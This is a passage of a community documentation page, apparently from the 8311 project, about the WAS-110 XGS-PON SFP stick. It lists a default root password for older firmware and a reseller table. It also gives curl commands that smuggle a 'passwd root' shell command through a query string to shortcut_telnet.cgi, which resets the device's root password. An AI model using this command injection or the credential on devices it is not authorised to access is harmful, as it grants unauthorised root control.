+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>update-crypto-policies<span class="w"> </span>--set<span class="w"> </span>LEGACY
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>ssh<span class="w"> </span>-oHostKeyAlgorithms<span class="o">=</span>+ssh-rsa<span class="w"> </span>-oPubkeyAcceptedKeyTypes<span class="o">=</span>+ssh-rsa<span class="w"> </span>root@192.168.11.1
+</code></pre></div>
+</details>
+<div class="tabbed-set tabbed-alternate" data-tabs="7:2"><input checked="checked" id="firmware-v1021_1" name="__tabbed_7" type="radio" /><input id="firmware--v1020_1" name="__tabbed_7" type="radio" /><div class="tabbed-labels"><label for="firmware-v1021_1">Firmware v1.0.21</label><label for="firmware--v1020_1">Firmware &lt;= v1.0.20</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<p>The <ins>root</ins> password is undisclosed at this time, use the suggested exploit below to gain root privileges.</p>
+</div>
+<div class="tabbed-block">
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>root</td>
+<td>QpZm@4246#5753</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<details class="bug">
+<summary>Exploit to temporarily change the root password</summary>
+<p>Run the following command(s) to temporarily change the root password to <code>root</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="8:3"><input checked="checked" id="windows_1" name="__tabbed_8" type="radio" /><input id="macos_1" name="__tabbed_8" type="radio" /><input id="linux_1" name="__tabbed_8" type="radio" /><div class="tabbed-labels"><label for="windows_1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 3h9v9H2zm9 19H2v-9h9zM21 3v9h-9V3zm0 19h-9v-9h9z"/></svg></span> Windows</label><label for="macos_1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg></span> macOS</label><label for="linux_1"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.504 0q-.232 0-.48.021c-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.4.4 0 0 0-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071s1.592-.536 2.257-1.306c.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.36.36 0 0 0-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139m.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105l-.004-.021-.004-.024a1.8 1.8 0 0 1-.15.706.95.95 0 0 1-.213.335 1 1 0 0 0-.088-.042c-.104-.045-.198-.064-.284-.133a1.3 1.3 0 0 0-.22-.066c.05-.06.146-.133.183-.198q.08-.193.088-.402v-.02a1.2 1.2 0 0 0-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 0 0-.205.334 1.2 1.2 0 0 0-.09.4v.019q.002.134.02.267c-.193-.067-.438-.135-.607-.202a2 2 0 0 1-.018-.2v-.02a1.8 1.8 0 0 1 .15-.768 1.08 1.08 0 0 1 .43-.533 1 1 0 0 1 .594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2q.018-.136.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.6.6 0 0 0-.166-.267.25.25 0 0 0-.183-.064h-.021c-.071.006-.13.04-.186.132a.55.55 0 0 0-.12.27 1 1 0 0 0-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268q.014.014.034.024c-.07.057-.117.07-.176.136a.3.3 0 0 1-.131.068 2.6 2.6 0 0 1-.275-.402 1.8 1.8 0 0 1-.155-.667 1.8 1.8 0 0 1 .08-.668 1.4 1.4 0 0 1 .283-.535c.128-.133.26-.2.418-.2m1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.57.57 0 0 1 .016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.1 1.1 0 0 1-.448-.067 4 4 0 0 1-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71q-.104-.403.193-.6c.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.7 2.7 0 0 0-.402-.533 1.5 1.5 0 0 0-.275-.333c.182 0 .338-.03.465-.067a.62.62 0 0 0 .314-.334c.108-.267 0-.697-.345-1.163s-.931-.995-1.788-1.521c-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.1 8.1 0 0 1 .647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335q.058.005.11.006c.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01q.08 0 .157.014c.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602q-.553-.1-.723-.4c-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336m7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8 8 0 0 1-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065m-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg></span> Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>curl.exe<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>null<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root&quot;</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root&quot;</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="admonition note">
+<p class="admonition-title">The following commands assume <a href="https://www.debian.org/" rel="noopener" target="_blank">Debian</a> or derivatives<sup id="fnref:4"><a class="footnote-ref" href="#fn:4">4</a></sup></p>
+</div>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>curl
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span><span class="s2">&quot;http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root&quot;</span>
+</code></pre></div>
+</div>
+</div>
+</div>
+</details>
+<h2 id="value-added-resellers">Value-Added Resellers<a class="headerlink" href="#value-added-resellers" title="Permanent link">&para;</a></h2>
+<div class="admonition tip">
+<p class="admonition-title">Participate in <a href="../../../../discord/group-buys/">group buys</a> on the 8311 Discord community server for discounted pricing</p>
+<p>Pre-flashed with the <a href="https://github.com/djGrrr/8311-was-110-firmware-builder" rel="noopener" target="_blank">8311 community firmware</a> for easy
+setup and the shortest downtime.</p>
+</div>
+<table>
+<thead>
+<tr>
+<th>Company</th>
+<th>Product Number</th>
+<th>E-commerce</th>
+<th>Firmware</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://ascentoptics.com/" rel="noopener" target="_blank">Ascent Optics</a></td>
+<td><a href="https://ascentoptics.com/product/xgspon-onu-stick.html" rel="noopener" target="_blank">XSPU-P9T9R-NxCM</a></td>
+<td><a href="https://detail.1688.com/offer/821866799456.html" rel="noopener" target="_blank">Chinese Alibaba</a> <img alt="🇨🇳" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f1e8-1f1f3.svg" title=":flag_cn:" /></td>
+<td>PTXG (Potron)</td>
+</tr>
+<tr>
+<td><a href="https://azoresnetworks.com/" rel="noopener" target="_blank">Azores Networks</a></td>
+<td>XSS</td>
+<td></td>
+<td>BFW/Azores</td>
+</tr>
+<tr>
+<td><a href="https://dzsi.com/" rel="noopener" target="_blank">DZS</a></td>
+<td>5311XP</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://ecin.ca/" rel="noopener" target="_blank">E.C.I. Networks</a></td>
+<td><a href="https://ecin.ca/custom-xgs-pon-sfp-stick-module-xgspon-ont-w-t-mac-function-mounted-on-sfp-package/" rel="noopener" target="_blank">EN-XGSFPP-OMAC-V2</a></td>
+<td><img alt="🌐" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f310.svg" title=":globe_with_meridians:" /></td>
+<td>BFW/Azores</td>
+</tr>
+<tr>
+<td><a href="https://www.fibermall.com/" rel="noopener" target="_blank">FiberMall</a></td>
+<td><a href="https://www.fibermall.com/sale-460693-xgspon-onu-sfp-stick.htm" rel="noopener" target="_blank">XGSPON-ONU-STICK</a></td>
+<td><img alt="🌐" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/1f310.svg" title=":globe_with_meridians:" /></td>
+<td>BFW/Azores</td>
+</tr>
+<tr>
+<td><a href="https://ontolt.com/" rel="noopener" target="_blank">FEPL</a></td>
+<td>XGSPON-ONU-STICK</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><a href="https://zisacom.com/" rel="noopener" target="_blank">ZISA</a></td>
+<td>OP151XGS</td>
+<td><a href="https://www.alibaba.com/product-detail/New-Arrival-FTTH-Modem-Symmetry-Module_1601389274805.html" rel="noopener" target="_blank">Alibaba</a></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><small>Purchase at your discretion, we take no responsibility or liability for the listed resellers.</small></li>
+</ul>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p><a href="https://www.bfw-solutions.com/en/gpon-family-141" rel="noopener" target="_blank">https://www.bfw-solutions.com/en/gpon-family-141</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p><a href="https://www.maxlinear.com/product/access/fiber-access/socs-for-optical-networking-units-onu/prx126" rel="noopener" target="_blank">https://www.maxlinear.com/product/access/fiber-access/socs-for-optical-networking-units-onu/prx126</a>&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://en.wikipedia.org/wiki/Procfs" rel="noopener" target="_blank">https://en.wikipedia.org/wiki/Procfs</a>&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 3 in the text">&#8617;</a></p>
+</li>
+<li id="fn:4">
+<p><a href="https://www.debian.org/derivatives/" rel="noopener" target="_blank">https://www.debian.org/derivatives/</a>&#160;<a class="footnote-backref" href="#fnref:4" title="Jump back to footnote 4 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:4" title="Jump back to footnote 4 in the text">&#8617;</a></p>
+</li>
+<li id="fn:5">
+<p><a href="https://en.wikipedia.org/wiki/Memory_Technology_Device" rel="noopener" target="_blank">https://en.wikipedia.org/wiki/Memory_Technology_Device</a>&#160;<a class="footnote-backref" href="#fnref:5" title="Jump back to footnote 5 in the text">&#8617;</a></p>
+</li>
+<li id="fn:6">
+<p><a href="https://en.wikipedia.org/wiki/UBIFS" rel="noopener" target="_blank">https://en.wikipedia.org/wiki/UBIFS</a>&#160;<a class="footnote-backref" href="#fnref:6" title="Jump back to footnote 6 in the text">&#8617;</a></p>
+</li>
+<li id="fn:7">
+<p><a href="https://en.wikipedia.org/wiki/SquashFS" rel="noopener" target="_blank">https://en.wikipedia.org/wiki/SquashFS</a>&#160;<a class="footnote-backref" href="#fnref:7" title="Jump back to footnote 7 in the text">&#8617;</a></p>
+</li>
+<li id="fn:10">
+<p><a href="https://boxmatrix.info/wiki/Property:Falcon" rel="noopener" target="_blank">https://boxmatrix.info/wiki/Property:Falcon</a>&#160;<a class="footnote-backref" href="#fnref:10" title="Jump back to footnote 8 in the text">&#8617;</a></p>
+</li>
+<li id="fn:11">
+<p><a href="https://members.snia.org/document/dl/25916" rel="noopener" target="_blank">SFF-8472</a>&#160;<a class="footnote-backref" href="#fnref:11" title="Jump back to footnote 9 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+
+        <!-- Feedback ratings -->
+        <div class="md-feedback__list">
+          
+            <button
+              class="md-feedback__icon md-icon"
+              type="submit"
+              title="This page was helpful"
+              data-md-value="1"
+            >
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m7 0c0 .8-.7 1.5-1.5 1.5S14 10.3 14 9.5 14.7 8 15.5 8s1.5.7 1.5 1.5m-5 7.73c-1.75 0-3.29-.73-4.19-1.81L9.23 14c.45.72 1.52 1.23 2.77 1.23s2.32-.51 2.77-1.23l1.42 1.42c-.9 1.08-2.44 1.81-4.19 1.81"/></svg>
+            </button>
+          
+            <button
+              class="md-feedback__icon md-icon"
+              type="submit"
+              title="This page could be improved"
+              data-md-value="0"
+            >
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10m-6.5-4c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5-1.5-.7-1.5-1.5.7-1.5 1.5-1.5M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m2 4.5c1.75 0 3.29.72 4.19 1.81l-1.42 1.42C14.32 16.5 13.25 16 12 16s-2.32.5-2.77 1.23l-1.42-1.42C8.71 14.72 10.25 14 12 14"/></svg>
+            </button>
+          
+        </div>
+
+        <!-- Feedback rating notes (shown after submission) -->
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+
+              <!-- Determine title -->
+              
+                
+              
+
+              <!-- Replace {url} and {title} placeholders in note -->
+              Thanks for your feedback!
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+
+              <!-- Determine title -->
+              
+                
+              
+
+              <!-- Replace {url} and {title} placeholders in note -->
+              Thanks for your feedback! Help us improve this page by using our <a href="https://github.com/up-n-atom/8311/issues/new/?title=[Feedback]+WAS-110+-+/xgs-pon/ont/bfw-solutions/was-110/" target="_blank" rel="noopener">feedback form</a>.
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+  <div class="md-feedback">
+    <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Donate', 'var(--md-primary-fg-color)', 'U7U2175BHA');kofiwidget2.draw();</script> 
+  </div>
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      CC BY-NC-SA 4.0
+    </div>
+  
+  
+    <div>
+      Made with
+      <a
+        href="https://squidfunk.github.io/mkdocs-material/"
+        target="_blank" rel="noopener"
+      >
+        Material for MkDocs
+      </a>
+    </div>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://discord.com/servers/8311-886329492438671420" target="_blank" rel="noopener" title="discord.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485 485 0 0 0 404.081 32.03a1.82 1.82 0 0 0-1.923.91 338 338 0 0 0-14.9 30.6 447.9 447.9 0 0 0-134.426 0 310 310 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.7 483.7 0 0 0-119.688 37.107 1.7 1.7 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.02 2.02 0 0 0 .765 1.375 487.7 487.7 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348 348 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321 321 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251 251 0 0 0 9.109-7.137 1.82 1.82 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.81 1.81 0 0 1 1.924.233 235 235 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.4 301.4 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391 391 0 0 0 30.014 48.815 1.86 1.86 0 0 0 2.063.7A486 486 0 0 0 610.7 405.729a1.88 1.88 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+      <div class="md-consent" data-md-component="consent" id="__consent" hidden>
+        <div class="md-consent__overlay"></div>
+        <aside class="md-consent__inner">
+          <form class="md-consent__form md-grid md-typeset" name="consent">
+            
+
+
+  
+
+
+<h4>Cookie consent</h4>
+<p>We use cookies to measure the effectiveness of our documentation and whether users find what they're searching for. With your consent, you're helping us to make our documentation better.</p>
+<input class="md-toggle" type="checkbox" id="__settings" >
+<div class="md-consent__settings">
+  <ul class="task-list">
+    
+    
+      
+        
+  
+  
+    
+    
+  
+  <li class="task-list-item">
+    <label class="task-list-control">
+      <input type="checkbox" name="analytics" checked>
+      <span class="task-list-indicator"></span>
+      Google Analytics
+    </label>
+  </li>
+
+      
+    
+    
+      
+        
+  
+  
+    
+    
+  
+  <li class="task-list-item">
+    <label class="task-list-control">
+      <input type="checkbox" name="github" checked>
+      <span class="task-list-indicator"></span>
+      GitHub
+    </label>
+  </li>
+
+      
+    
+    
+  </ul>
+</div>
+<div class="md-consent__controls">
+  
+    
+      <button class="md-button md-button--primary">Accept</button>
+    
+    
+    
+  
+    
+    
+    
+      <label class="md-button" for="__settings">Manage settings</label>
+    
+  
+</div>
+          </form>
+        </aside>
+      </div>
+      <script>var consent=__md_get("__consent");if(consent)for(var input of document.forms.consent.elements)input.name&&(input.checked=consent[input.name]||!1);else"file:"!==location.protocol&&setTimeout((function(){document.querySelector("[data-md-component=consent]").hidden=!1}),250);var form=document.forms.consent;for(var action of["submit","reset"])form.addEventListener(action,(function(e){if(e.preventDefault(),"reset"===e.type)for(var n of document.forms.consent.elements)n.name&&(n.checked=!1);__md_set("__consent",Object.fromEntries(Array.from(new FormData(form).keys()).map((function(e){return[e,!0]})))),location.hash="",location.reload()}))</script>
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["announce.dismiss", "content.code.annotate", "content.code.copy", "content.tabs.link", "navigation.expand", "navigation.indexes", "navigation.tabs", "navigation.top", "navigation.tracking", "navigation.path"], "search": "../../../../assets/javascripts/workers/search.ad38c271.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+  
+      <script src="../../../../assets/javascripts/bundle.eb438620.min.js"></script>
+      
+        <script src="../../../../javascripts/isp.js"></script>
+      
+        <script src="../../../../javascripts/swiper.js"></script>
+      
+        <script src="../../../../javascripts/table.js"></script>
+      
+    
+
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": false, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
